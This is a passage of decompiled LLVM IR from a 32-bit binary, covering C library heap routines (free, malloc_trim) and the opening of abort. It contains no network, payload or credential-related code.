  %v0_8053a41 = load i32, i32* @edi, align 4
  %v2_8053a41 = add i32 %v0_8053a41, %v1_80539e8
  %v1_8053a44 = or i32 %v2_8053a41, 1
  store i32 %v1_8053a44, i32* %eax.global-to-local, align 4
  %v1_8053a47 = load i32, i32* @ecx, align 4
  %v2_8053a47 = add i32 %v1_8053a47, 4
  %v3_8053a47 = inttoptr i32 %v2_8053a47 to i32*
  store i32 %v1_8053a44, i32* %v3_8053a47, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v0_8053a4e = load i32, i32* @ecx, align 4
  store i32 %v0_8053a4e, i32* %v3_8053a4e, align 4
  br label %dec_label_pc_8053a51

dec_label_pc_8053a51:                             ; preds = %dec_label_pc_8053a1d, %dec_label_pc_8053a41
  store i32 %v3_80539a3, i32* @ecx, align 4
  %v1_8053a55 = icmp eq i32 %v3_80539a3, 0
  %v1_8053a57 = icmp eq i1 %v1_8053a55, false
  br i1 %v1_8053a57, label %dec_label_pc_80539a3, label %dec_label_pc_8053a5d

dec_label_pc_8053a5d:                             ; preds = %dec_label_pc_8053a51, %dec_label_pc_805398f
  store i32 %v4_8053987, i32* @ecx, align 4
  %v15_8053a61 = icmp eq i32 %v0_805399d, %v4_8053987
  br i1 %v15_8053a61, label %dec_label_pc_8053ae5, label %dec_label_pc_8053a67

dec_label_pc_8053a67:                             ; preds = %dec_label_pc_8053a5d
  %v4_8053a67 = add i32 %v0_805399d, 4
  br label %dec_label_pc_805398f

dec_label_pc_8053a71:                             ; preds = %dec_label_pc_8053a80.preheader, %dec_label_pc_8053a71
  %v1_8053a7520 = phi i32 [ 1, %dec_label_pc_8053a80.preheader ], [ %v0_8053a80.pre, %dec_label_pc_8053a71 ]
  %v2_8053a75 = mul i32 %v1_8053a7520, 8
  %v4_8053a75 = add i32 %v3_8053a75, %v2_8053a75
  store i32 %v4_8053a75, i32* %eax.global-to-local, align 4
  %v1_8053a79 = add i32 %v1_8053a7520, 1
  store i32 %v1_8053a79, i32* %edx.global-to-local, align 4
  %v2_8053a7a = add i32 %v4_8053a75, 12
  %v3_8053a7a = inttoptr i32 %v2_8053a7a to i32*
  store i32 %v4_8053a75, i32* %v3_8053a7a, align 4
  %v0_8053a7d = load i32, i32* %eax.global-to-local, align 4
  %v2_8053a7d = add i32 %v0_8053a7d, 8
  %v3_8053a7d = inttoptr i32 %v2_8053a7d to i32*
  store i32 %v0_8053a7d, i32* %v3_8053a7d, align 4
  %v0_8053a80.pre = load i32, i32* %edx.global-to-local, align 4
  %v7_8053a83 = icmp sgt i32 %v0_8053a80.pre, 95
  br i1 %v7_8053a83, label %dec_label_pc_8053a85, label %dec_label_pc_8053a71

dec_label_pc_8053a85:                             ; preds = %dec_label_pc_8053a71
  store i32 %tmp11, i32* %eax.global-to-local, align 4
  %v1_8053a89 = add i32 %tmp11, 864
  %v2_8053a89 = inttoptr i32 %v1_8053a89 to i32*
  %v3_8053a89 = load i32, i32* %v2_8053a89, align 4
  %v4_8053a89 = or i32 %v3_8053a89, 1
  store i32 %v4_8053a89, i32* %v2_8053a89, align 4
  %v0_8053a90 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053a90 = add i32 %v0_8053a90, 840
  %v2_8053a90 = inttoptr i32 %v1_8053a90 to i32*
  store i32 0, i32* %v2_8053a90, align 4
  %v0_8053a9a = load i32, i32* %eax.global-to-local, align 4
  %v1_8053a9a = add i32 %v0_8053a9a, 852
  %v2_8053a9a = inttoptr i32 %v1_8053a9a to i32*
  store i32 65536, i32* %v2_8053a9a, align 4
  %v0_8053aa4 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053aa4 = add i32 %v0_8053aa4, 844
  %v2_8053aa4 = inttoptr i32 %v1_8053aa4 to i32*
  store i32 262144, i32* %v2_8053aa4, align 4
  %v0_8053aae = load i32, i32* %eax.global-to-local, align 4
  %v1_8053aae = add i32 %v0_8053aae, 836
  %v2_8053aae = inttoptr i32 %v1_8053aae to i32*
  store i32 262144, i32* %v2_8053aae, align 4
  store i32 %tmp11, i32* @edx, align 4
  %v2_8053abf = load i32, i32* %arg1, align 4
  %v1_8053ac1 = urem i32 %v2_8053abf, 4
  %v1_8053ac4 = or i32 %v1_8053ac1, 72
  store i32 %v1_8053ac4, i32* %arg1, align 4
  %v0_8053ac9 = load i32, i32* @edx, align 4
  %v1_8053acb = add i32 %v0_8053ac9, 52
  store i32 %v1_8053acb, i32* %eax.global-to-local, align 4
  %v2_8053ace = add i32 %v0_8053ac9, 44
  %v3_8053ace = inttoptr i32 %v2_8053ace to i32*
  store i32 %v1_8053acb, i32* %v3_8053ace, align 4
  %v1_8053ad3 = call i32 @sysconf(i32 30)
  store i32 %v1_8053ad3, i32* %eax.global-to-local, align 4
  store i32 %tmp11, i32* @ecx, align 4
  %v2_8053adf = add i32 %tmp11, 860
  %v3_8053adf = inttoptr i32 %v2_8053adf to i32*
  store i32 %v1_8053ad3, i32* %v3_8053adf, align 4
  br label %dec_label_pc_8053ae5

dec_label_pc_8053ae5:                             ; preds = %dec_label_pc_8053a5d, %dec_label_pc_8053a85
  store i32 %v0_8053948, i32* @ebx, align 4
  store i32 %v0_8053947, i32* @esi, align 4
  store i32 %v0_8053946, i32* @edi, align 4
  %v0_8053aec = load i32, i32* %eax.global-to-local, align 4
  ret i32 %v0_8053aec

; uselistorder directives
  uselistorder i32 %v0_8053a7d, { 1, 0 }
  uselistorder i32 %v0_8053a3c, { 1, 0 }
  uselistorder i32 %v1_80539f7, { 1, 0 }
  uselistorder i32 %v2_80539f0, { 1, 0 }
  uselistorder i32 %v1_80539e8, { 0, 2, 1, 3 }
  uselistorder i32 %v1_80539f4, { 1, 0 }
  uselistorder i32 %v3_80539a3, { 2, 1, 3, 0 }
  uselistorder i32 %v0_80539c0, { 2, 1, 0, 4, 3 }
  uselistorder i32 %v0_805399d, { 1, 0, 3, 2 }
  uselistorder i32* %v3_8053a4e, { 1, 0 }
  uselistorder i32 %v1_8053968, { 1, 0 }
  uselistorder i32 %tmp11, { 3, 14, 13, 11, 10, 8, 7, 1, 9, 2, 6, 5, 0, 12, 4 }
  uselistorder i32* %ebp.global-to-local, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 24, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 17, 18, 15, 16, 19, 20, 21, 22, 23, 25, 26, 27, 28 }
  uselistorder i32 860, { 1, 0 }
  uselistorder label %dec_label_pc_8053ae5, { 1, 0 }
  uselistorder label %dec_label_pc_8053a71, { 1, 0 }
  uselistorder label %dec_label_pc_8053a51, { 1, 0 }
  uselistorder label %dec_label_pc_8053a1d, { 1, 0 }
  uselistorder label %dec_label_pc_8053a15, { 1, 0 }
  uselistorder label %dec_label_pc_80539e0, { 1, 0 }
}

define i32 @free(i32 %arg1) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %v0_8053aed = load i32, i32* @ebp, align 4
  %v0_8053aee = load i32, i32* @edi, align 4
  %v0_8053aef = load i32, i32* @esi, align 4
  %v0_8053af0 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @edi, align 4
  %v1_8053af8 = icmp eq i32 %arg1, 0
  br i1 %v1_8053af8, label %dec_label_pc_8053c81, label %dec_label_pc_8053b00

dec_label_pc_8053b00:                             ; preds = %entry
  %v2_8053b0b = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_8053b0b, i32* @eax, align 4
  %v2_8053b10 = call i32 @__pthread_return_void(i32 %v2_8053b0b, i32 134563799)
  store i32 %v2_8053b10, i32* %eax.global-to-local, align 4
  %v1_8053b1c = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b3d0.501 to i32))
  %v1_8053b21 = add i32 %arg1, -8
  store i32 %v1_8053b21, i32* @ecx, align 4
  %v0_8053b24 = load i8, i8* @global_var_8061840.502, align 1
  %v1_8053b24 = sext i8 %v0_8053b24 to i32
  store i32 %v1_8053b24, i32* %eax.global-to-local, align 4
  %v1_8053b2c = add i32 %arg1, -4
  %v2_8053b2c = inttoptr i32 %v1_8053b2c to i32*
  %v3_8053b2c = load i32, i32* %v2_8053b2c, align 4
  %v1_8053b31 = and i32 %v3_8053b2c, -4
  %v4_8053b31 = trunc i32 %v1_8053b31 to i8
  store i32 %v1_8053b31, i32* @ebx, align 4
  %v8_8053b36 = icmp ugt i8 %v4_8053b31, %v0_8053b24
  br i1 %v8_8053b36, label %dec_label_pc_8053b58, label %dec_label_pc_8053b38

dec_label_pc_8053b38:                             ; preds = %dec_label_pc_8053b00
  %v2_8053b38 = udiv i32 %v3_8053b2c, 8
  %v1_8053b3b = or i32 %v1_8053b24, 3
  %v3_8053b3b = trunc i32 %v1_8053b3b to i8
  store i32 %v1_8053b3b, i32* %eax.global-to-local, align 4
  store i8 %v3_8053b3b, i8* @global_var_8061840.502, align 64
  %v1_8053b43 = mul nuw i32 %v2_8053b38, 4
  %v2_8053b43 = add i32 %v1_8053b43, ptrtoint (i8* @global_var_8061840.502 to i32)
  store i32 %v2_8053b43, i32* @edx, align 4
  %v1_8053b4a = add i32 %v1_8053b43, add (i32 ptrtoint (i8* @global_var_8061840.502 to i32), i32 -4)
  %v2_8053b4a = inttoptr i32 %v1_8053b4a to i32*
  %v3_8053b4a = load i32, i32* %v2_8053b4a, align 4
  store i32 %v3_8053b4a, i32* %eax.global-to-local, align 4
  %v3_8053b4d = inttoptr i32 %arg1 to i32*
  store i32 %v3_8053b4a, i32* %v3_8053b4d, align 4
  %v0_8053b50 = load i32, i32* @ecx, align 4
  %v1_8053b50 = load i32, i32* @edx, align 4
  %v2_8053b50 = add i32 %v1_8053b50, -4
  %v3_8053b50 = inttoptr i32 %v2_8053b50 to i32*
  store i32 %v0_8053b50, i32* %v3_8053b50, align 4
  br label %dec_label_pc_8053c70

dec_label_pc_8053b58:                             ; preds = %dec_label_pc_8053b00
  %v1_8053b58 = trunc i32 %v3_8053b2c to i8
  %v2_8053b58 = and i8 %v1_8053b58, 2
  %v3_8053b58 = icmp eq i8 %v2_8053b58, 0
  %v5_8053b58 = zext i8 %v2_8053b58 to i32
  %v7_8053b58 = and i32 %v3_8053b2c, -256
  %v8_8053b58 = or i32 %v5_8053b58, %v7_8053b58
  store i32 %v8_8053b58, i32* @edx, align 4
  %v1_8053b5b = icmp eq i1 %v3_8053b58, false
  br i1 %v1_8053b5b, label %dec_label_pc_8053c50, label %dec_label_pc_8053b61

dec_label_pc_8053b61:                             ; preds = %dec_label_pc_8053b58
  %v1_8053b61 = or i32 %v1_8053b24, 1
  %v3_8053b61 = trunc i32 %v1_8053b61 to i8
  store i32 %v1_8053b61, i32* %eax.global-to-local, align 4
  %v2_8053b64 = add i32 %v1_8053b31, %v1_8053b21
  store i32 %v2_8053b64, i32* @esi, align 4
  store i8 %v3_8053b61, i8* @global_var_8061840.502, align 64
  %v1_8053b6c = add i32 %v2_8053b64, 4
  %v2_8053b6c = inttoptr i32 %v1_8053b6c to i32*
  %v3_8053b6c = load i32, i32* %v2_8053b6c, align 4
  store i32 %v3_8053b6c, i32* %eax.global-to-local, align 4
  %v2_8053b73 = inttoptr i32 %v1_8053b2c to i8*
  %v3_8053b73 = load i8, i8* %v2_8053b73, align 1
  %v4_8053b73 = urem i8 %v3_8053b73, 2
  %v5_8053b73 = icmp eq i8 %v4_8053b73, 0
  %v1_8053b77 = icmp eq i1 %v5_8053b73, false
  br i1 %v1_8053b77, label %dec_label_pc_8053b9a, label %dec_label_pc_8053b79

dec_label_pc_8053b79:                             ; preds = %dec_label_pc_8053b61
  %v2_8053b79 = inttoptr i32 %v1_8053b21 to i32*
  %v3_8053b79 = load i32, i32* %v2_8053b79, align 4
  store i32 %v3_8053b79, i32* @ebp, align 4
  %v2_8053b7e = sub i32 %v1_8053b21, %v3_8053b79
  store i32 %v2_8053b7e, i32* %eax.global-to-local, align 4
  %v1_8053b80 = add i32 %v2_8053b7e, 8
  %v2_8053b80 = inttoptr i32 %v1_8053b80 to i32*
  %v3_8053b80 = load i32, i32* %v2_8053b80, align 4
  store i32 %v3_8053b80, i32* @edi, align 4
  %v1_8053b83 = add i32 %v2_8053b7e, 12
  %v2_8053b83 = inttoptr i32 %v1_8053b83 to i32*
  %v3_8053b83 = load i32, i32* %v2_8053b83, align 4
  store i32 %v3_8053b83, i32* @edx, align 4
  %v1_8053b86 = add i32 %v3_8053b80, 12
  %v2_8053b86 = inttoptr i32 %v1_8053b86 to i32*
  %v3_8053b86 = load i32, i32* %v2_8053b86, align 4
  store i32 %v3_8053b86, i32* @ecx, align 4
  %v12_8053b89 = icmp eq i32 %v3_8053b86, %v2_8053b7e
  %v1_8053b8b = icmp eq i1 %v12_8053b89, false
  br i1 %v1_8053b8b, label %dec_label_pc_8053bc9, label %dec_label_pc_8053b8d

dec_label_pc_8053b8d:                             ; preds = %dec_label_pc_8053b79
  %v1_8053b8d = add i32 %v3_8053b83, 8
  %v2_8053b8d = inttoptr i32 %v1_8053b8d to i32*
  %v3_8053b8d = load i32, i32* %v2_8053b8d, align 4
  %v15_8053b8d = icmp eq i32 %v3_8053b8d, %v3_8053b86
  %v1_8053b90 = icmp eq i1 %v15_8053b8d, false
  br i1 %v1_8053b90, label %dec_label_pc_8053bc9, label %dec_label_pc_8053b92

dec_label_pc_8053b92:                             ; preds = %dec_label_pc_8053b8d
  %v2_8053b92 = add i32 %v3_8053b79, %v1_8053b31
  store i32 %v2_8053b92, i32* @ebx, align 4
  store i32 %v3_8053b83, i32* %v2_8053b86, align 4
  %v0_8053b97 = load i32, i32* @edi, align 4
  %v1_8053b97 = load i32, i32* @edx, align 4
  %v2_8053b97 = add i32 %v1_8053b97, 8
  %v3_8053b97 = inttoptr i32 %v2_8053b97 to i32*
  store i32 %v0_8053b97, i32* %v3_8053b97, align 4
  %v0_8053ba1.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_8053b9a

dec_label_pc_8053b9a:                             ; preds = %dec_label_pc_8053b61, %dec_label_pc_8053b92
  %v1_8053bad = phi i32 [ %v2_8053b64, %dec_label_pc_8053b61 ], [ %v0_8053ba1.pre, %dec_label_pc_8053b92 ]
  %v1_8053b9e = and i32 %v3_8053b6c, -4
  store i32 %v1_8053b9e, i32* @ebp, align 4
  %v1_8053ba1 = load i32, i32* @global_var_806186c.503, align 4
  %v12_8053ba1 = icmp eq i32 %v1_8053bad, %v1_8053ba1
  br i1 %v12_8053ba1, label %dec_label_pc_8053bfb, label %dec_label_pc_8053ba9

dec_label_pc_8053ba9:                             ; preds = %dec_label_pc_8053b9a
  %v2_8053ba9 = add i32 %v1_8053bad, 4
  %v3_8053ba9 = add i32 %v2_8053ba9, %v1_8053b9e
  %v4_8053ba9 = inttoptr i32 %v3_8053ba9 to i32*
  %v5_8053ba9 = load i32, i32* %v4_8053ba9, align 4
  store i32 %v5_8053ba9, i32* %eax.global-to-local, align 4
  %v3_8053bad = inttoptr i32 %v2_8053ba9 to i32*
  store i32 %v1_8053b9e, i32* %v3_8053bad, align 4
  %v0_8053bb0 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053bb0 = urem i32 %v0_8053bb0, 2
  %v2_8053bb0 = icmp eq i32 %v1_8053bb0, 0
  store i32 %v1_8053bb0, i32* %eax.global-to-local, align 4
  %v1_8053bb5 = icmp eq i1 %v2_8053bb0, false
  br i1 %v1_8053bb5, label %dec_label_pc_8053bd6, label %dec_label_pc_8053bb7

dec_label_pc_8053bb7:                             ; preds = %dec_label_pc_8053ba9
  %v0_8053bb7 = load i32, i32* @esi, align 4
  %v1_8053bb7 = add i32 %v0_8053bb7, 8
  %v2_8053bb7 = inttoptr i32 %v1_8053bb7 to i32*
  %v3_8053bb7 = load i32, i32* %v2_8053bb7, align 4
  store i32 %v3_8053bb7, i32* @edx, align 4
  %v1_8053bba = add i32 %v0_8053bb7, 12
  %v2_8053bba = inttoptr i32 %v1_8053bba to i32*
  %v3_8053bba = load i32, i32* %v2_8053bba, align 4
  store i32 %v3_8053bba, i32* %eax.global-to-local, align 4
  %v1_8053bbd = add i32 %v3_8053bb7, 12
  %v2_8053bbd = inttoptr i32 %v1_8053bbd to i32*
  %v3_8053bbd = load i32, i32* %v2_8053bbd, align 4
  store i32 %v3_8053bbd, i32* @edi, align 4
  %v12_8053bc0 = icmp eq i32 %v3_8053bbd, %v0_8053bb7
  %v1_8053bc2 = icmp eq i1 %v12_8053bc0, false
  br i1 %v1_8053bc2, label %dec_label_pc_8053bc9, label %dec_label_pc_8053bc4

dec_label_pc_8053bc4:                             ; preds = %dec_label_pc_8053bb7
  %v1_8053bc4 = add i32 %v3_8053bba, 8
  %v2_8053bc4 = inttoptr i32 %v1_8053bc4 to i32*
  %v3_8053bc4 = load i32, i32* %v2_8053bc4, align 4
  %v15_8053bc4 = icmp eq i32 %v3_8053bc4, %v3_8053bbd
  br i1 %v15_8053bc4, label %dec_label_pc_8053bce, label %dec_label_pc_8053bc9

dec_label_pc_8053bc9:                             ; preds = %dec_label_pc_8053bc4, %dec_label_pc_8053bb7, %dec_label_pc_8053b8d, %dec_label_pc_8053b79
  %v0_8053bc9 = call i32 @abort()
  store i32 %v0_8053bc9, i32* %eax.global-to-local, align 4
  %v1_8053bce.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8053bce

dec_label_pc_8053bce:                             ; preds = %dec_label_pc_8053bc4, %dec_label_pc_8053bc9
  %v1_8053bce = phi i32 [ %v3_8053bb7, %dec_label_pc_8053bc4 ], [ %v1_8053bce.pre, %dec_label_pc_8053bc9 ]
  %v0_8053bce = phi i32 [ %v3_8053bba, %dec_label_pc_8053bc4 ], [ %v0_8053bc9, %dec_label_pc_8053bc9 ]
  %v2_8053bce = add i32 %v1_8053bce, 12
  %v3_8053bce = inttoptr i32 %v2_8053bce to i32*
  store i32 %v0_8053bce, i32* %v3_8053bce, align 4
  %v0_8053bd1 = load i32, i32* @edx, align 4
  %v1_8053bd1 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053bd1 = add i32 %v1_8053bd1, 8
  %v3_8053bd1 = inttoptr i32 %v2_8053bd1 to i32*
  store i32 %v0_8053bd1, i32* %v3_8053bd1, align 4
  %v0_8053bd4 = load i32, i32* @ebx, align 4
  %v1_8053bd4 = load i32, i32* @ebp, align 4
  %v2_8053bd4 = add i32 %v1_8053bd4, %v0_8053bd4
  store i32 %v2_8053bd4, i32* @ebx, align 4
  br label %dec_label_pc_8053bd6

dec_label_pc_8053bd6:                             ; preds = %dec_label_pc_8053ba9, %dec_label_pc_8053bce
  %v0_8053bd6 = load i32, i32* @global_var_806187c.521, align 4
  store i32 %v0_8053bd6, i32* %eax.global-to-local, align 4
  %v0_8053bdb = load i32, i32* @ecx, align 4
  %v1_8053bdb = add i32 %v0_8053bdb, 12
  %v2_8053bdb = inttoptr i32 %v1_8053bdb to i32*
  store i32 ptrtoint (i32* @global_var_8061874.505 to i32), i32* %v2_8053bdb, align 4
  %v0_8053be2 = load i32, i32* %eax.global-to-local, align 4
  %v1_8053be2 = load i32, i32* @ecx, align 4
  %v2_8053be2 = add i32 %v1_8053be2, 8
  %v3_8053be2 = inttoptr i32 %v2_8053be2 to i32*
  store i32 %v0_8053be2, i32* %v3_8053be2, align 4
  %v0_8053be5 = load i32, i32* @ebx, align 4
  %v1_8053be5 = load i32, i32* @ecx, align 4
  %v3_8053be5 = add i32 %v1_8053be5, %v0_8053be5
  %v4_8053be5 = inttoptr i32 %v3_8053be5 to i32*
  store i32 %v0_8053be5, i32* %v4_8053be5, align 4
  %v0_8053be8 = load i32, i32* @ecx, align 4
  %v1_8053be8 = load i32, i32* %eax.global-to-local, align 4
  %v2_8053be8 = add i32 %v1_8053be8, 12
  %v3_8053be8 = inttoptr i32 %v2_8053be8 to i32*
  store i32 %v0_8053be8, i32* %v3_8053be8, align 4
  %v0_8053beb = load i32, i32* @ebx, align 4
  %v1_8053bed = or i32 %v0_8053beb, 1
  store i32 %v1_8053bed, i32* %eax.global-to-local, align 4
  %v0_8053bf0 = load i32, i32* @ecx, align 4
  store i32 %v0_8053bf0, i32* @global_var_806187c.521, align 4
  %v2_8053bf6 = add i32 %v0_8053bf0, 4
  %v3_8053bf6 = inttoptr i32 %v2_8053bf6 to i32*
  store i32 %v1_8053bed, i32* %v3_8053bf6, align 4
  br label %dec_label_pc_8053c0b

dec_label_pc_8053bfb:                             ; preds = %dec_label_pc_8053b9a
  %v0_8053bfb = load i32, i32* @ebx, align 4
  %v2_8053bfb = add i32 %v0_8053bfb, %v1_8053b9e
  store i32 %v2_8053bfb, i32* @ebx, align 4
  %v1_8053bff = or i32 %v2_8053bfb, 1
  store i32 %v1_8053bff, i32* %eax.global-to-local, align 4
  %v1_8053c02 = load i32, i32* @ecx, align 4
  %v2_8053c02 = add i32 %v1_8053c02, 4
  %v3_8053c02 = inttoptr i32 %v2_8053c02 to i32*
  store i32 %v1_8053bff, i32* %v3_8053c02, align 4
  %v0_8053c05 = load i32, i32* @ecx, align 4
  store i32 %v0_8053c05, i32* @global_var_806186c.503, align 4
  br label %dec_label_pc_8053c0b

dec_label_pc_8053c0b:                             ; preds = %dec_label_pc_8053bd6, %dec_label_pc_8053bfb
  %v0_8053c0b = load i32, i32* @ebx, align 4
  %tmp21 = icmp ult i32 %v0_8053c0b, 131072
  br i1 %tmp21, label %dec_label_pc_8053c70, label %dec_label_pc_8053c13

dec_label_pc_8053c13:                             ; preds = %dec_label_pc_8053c0b
  %v0_8053c13 = load i8, i8* @global_var_8061840.502, align 64
  %v1_8053c13 = and i8 %v0_8053c13, 2
  %v2_8053c13 = icmp eq i8 %v1_8053c13, 0
  br i1 %v2_8053c13, label %dec_label_pc_8053c2c, label %dec_label_pc_8053c1c

dec_label_pc_8053c1c:                             ; preds = %dec_label_pc_8053c13
  %v2_8053c24 = call i32 @__malloc_consolidate(i32* bitcast (i8* @global_var_8061840.502 to i32*))
  store i32 %v2_8053c24, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053c2c

dec_label_pc_8053c2c:                             ; preds = %dec_label_pc_8053c13, %dec_label_pc_8053c1c
  %v0_8053c2c = load i32, i32* @global_var_806186c.503, align 4
  store i32 %v0_8053c2c, i32* %eax.global-to-local, align 4
  %v1_8053c31 = add i32 %v0_8053c2c, 4
  %v2_8053c31 = inttoptr i32 %v1_8053c31 to i32*
  %v3_8053c31 = load i32, i32* %v2_8053c31, align 4
  %v1_8053c34 = and i32 %v3_8053c31, -4
  store i32 %v1_8053c34, i32* %eax.global-to-local, align 4
  %v1_8053c37 = load i32, i32* @global_var_8061b84.519, align 4
  %v7_8053c37 = icmp ult i32 %v1_8053c34, %v1_8053c37
  br i1 %v7_8053c37, label %dec_label_pc_8053c70, label %dec_label_pc_8053c3f

dec_label_pc_8053c3f:                             ; preds = %dec_label_pc_8053c2c
  store i32 ptrtoint (i8* @global_var_8061840.502 to i32), i32* @edx, align 4
  %v0_8053c44 = load i32, i32* @global_var_8061b88.517, align 8
  store i32 %v0_8053c44, i32* @eax, align 4
  %v0_8053c49 = call i32 @__malloc_trim()
  store i32 %v0_8053c49, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053c70

dec_label_pc_8053c50:                             ; preds = %dec_label_pc_8053b58
  %v2_8053c50 = inttoptr i32 %v1_8053b21 to i32*
  %v3_8053c50 = load i32, i32* %v2_8053c50, align 4
  %v0_8053c53 = load i32, i32* @global_var_8061b90.510, align 16
  %v1_8053c53 = add i32 %v0_8053c53, -1
  store i32 %v1_8053c53, i32* @global_var_8061b90.510, align 16
  %v2_8053c59 = add i32 %v3_8053c50, %v1_8053b31
  store i32 %v2_8053c59, i32* %eax.global-to-local, align 4
  %v2_8053c5c = sub i32 %v1_8053b21, %v3_8053c50
  %v0_8053c62 = load i32, i32* @global_var_8061ba4.513, align 4
  %v2_8053c62 = sub i32 %v0_8053c62, %v2_8053c59
  store i32 %v2_8053c62, i32* @global_var_8061ba4.513, align 4
  %v4_8053c68 = call i32 @munmap(i32 %v2_8053c5c, i32 %v2_8053c59, i32 %v1_8053b31, i32 %v1_8053b31)
  store i32 %v4_8053c68, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053c70

dec_label_pc_8053c70:                             ; preds = %dec_label_pc_8053c2c, %dec_label_pc_8053c0b, %dec_label_pc_8053c3f, %dec_label_pc_8053b38, %dec_label_pc_8053c50
  store i32 %v2_8053b0b, i32* @eax, align 4
  %v2_8053c79 = call i32 @__pthread_return_void(i32 %v2_8053b0b, i32 1)
  store i32 %v2_8053c79, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053c81

dec_label_pc_8053c81:                             ; preds = %entry, %dec_label_pc_8053c70
  %.0 = phi i32 [ undef, %entry ], [ %v2_8053c79, %dec_label_pc_8053c70 ]
  store i32 %v0_8053af0, i32* @ebx, align 4
  store i32 %v0_8053aef, i32* @esi, align 4
  store i32 %v0_8053aee, i32* @edi, align 4
  store i32 %v0_8053aed, i32* @ebp, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 %v3_8053c50, { 1, 0 }
  uselistorder i32 %v0_8053be5, { 1, 0 }
  uselistorder i32 %v1_8053bb0, { 1, 0 }
  uselistorder i32 %v2_8053ba9, { 1, 0 }
  uselistorder i32 %v1_8053b9e, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8053bad, { 1, 0 }
  uselistorder i32 %v1_8053b31, { 3, 4, 0, 1, 2, 5, 6 }
  uselistorder i32 %v3_8053b2c, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8053b21, { 1, 4, 2, 3, 0, 5 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 5, 3, 4, 6, 7, 8, 9, 10, 11, 14, 15, 12, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24 }
  uselistorder i32* bitcast (i8* @global_var_8061840.502 to i32*), { 0, 2, 1, 3 }
  uselistorder i32 ptrtoint (i32* @global_var_8061874.505 to i32), { 1, 2, 3, 4, 5, 6, 7, 0, 8 }
  uselistorder i32* @global_var_806186c.503, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32 ptrtoint (i32* @global_var_805b3d0.501 to i32), { 0, 1, 3, 2, 4 }
  uselistorder i32 %arg1, { 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8053c81, { 1, 0 }
  uselistorder label %dec_label_pc_8053c70, { 4, 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_8053c2c, { 1, 0 }
  uselistorder label %dec_label_pc_8053c0b, { 1, 0 }
  uselistorder label %dec_label_pc_8053bd6, { 1, 0 }
  uselistorder label %dec_label_pc_8053bce, { 1, 0 }
  uselistorder label %dec_label_pc_8053b9a, { 1, 0 }
}

define i32 @malloc_trim(i32 %arg1) local_unnamed_addr {
entry:
  %v0_8053c89 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8053c96 = call i32 @__malloc_consolidate(i32* inttoptr (i32 sext (i8 ptrtoint (i8* @global_var_8061840.502 to i8) to i32) to i32*))
  %v0_8053c9b = load i32, i32* @ebx, align 4
  store i32 %v0_8053c9b, i32* @eax, align 4
  store i32 ptrtoint (i8* @global_var_8061840.502 to i32), i32* @edx, align 4
  store i32 %v0_8053c89, i32* @ebx, align 4
  %v0_8053ca6 = call i32 @__malloc_trim()
  ret i32 %v0_8053ca6

; uselistorder directives
  uselistorder i32 ()* @__malloc_trim, { 1, 0 }
  uselistorder i32 ptrtoint (i8* @global_var_8061840.502 to i32), { 8, 7, 6, 0, 5, 4, 1, 3, 2 }
  uselistorder i8* @global_var_8061840.502, { 0, 5, 8, 7, 6, 4, 1, 3, 2 }
}

define i32 @abort() local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %stack_var_-272 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %v1_8053cb8 = call i32 @__pthread_return_0(i32 ptrtoint (i32* @global_var_805b3e8.522 to i32))
  %v12_8053cc2 = ptrtoint i32* %stack_var_-284 to i32
  store i32 31, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8053cc7

dec_label_pc_8053cc7:                             ; preds = %dec_label_pc_8053cc7.dec_label_pc_8053cc7_crit_edge, %entry
  %v0_8053cc7 = phi i32 [ %v12_8053cc2, %entry ], [ %v0_8053cc7.pre, %dec_label_pc_8053cc7.dec_label_pc_8053cc7_crit_edge ]
  %v1_8053cd222 = phi i32 [ 31, %entry ], [ %v1_8053cd2, %dec_label_pc_8053cc7.dec_label_pc_8053cc7_crit_edge ]
  %v2_8053cc7 = mul i32 %v1_8053cd222, 4
  %v3_8053cc7 = add i32 %v2_8053cc7, 152
  %v4_8053cc7 = add i32 %v3_8053cc7, %v0_8053cc7
  %v5_8053cc7 = inttoptr i32 %v4_8053cc7 to i32*
  store i32 0, i32* %v5_8053cc7, align 4
  %v0_8053cd2.pre = load i32, i32* %eax.global-to-local, align 4
  %v1_8053cd2 = add i32 %v0_8053cd2.pre, -1
  %v9_8053cd2 = icmp slt i32 %v1_8053cd2, 0
  store i32 %v1_8053cd2, i32* %eax.global-to-local, align 4
  %v1_8053cd3 = icmp eq i1 %v9_8053cd2, false
  br i1 %v1_8053cd3, label %dec_label_pc_8053cc7.dec_label_pc_8053cc7_crit_edge, label %dec_label_pc_8053cd5

dec_label_pc_8053cc7.dec_label_pc_8053cc7_crit_edge: ; preds = %dec_label_pc_8053cc7
  %v0_8053cc7.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8053cc7

dec_label_pc_8053cd5:                             ; preds = %dec_label_pc_8053cc7
  %v0_8053cd5 = load i32, i32* @ebx, align 4
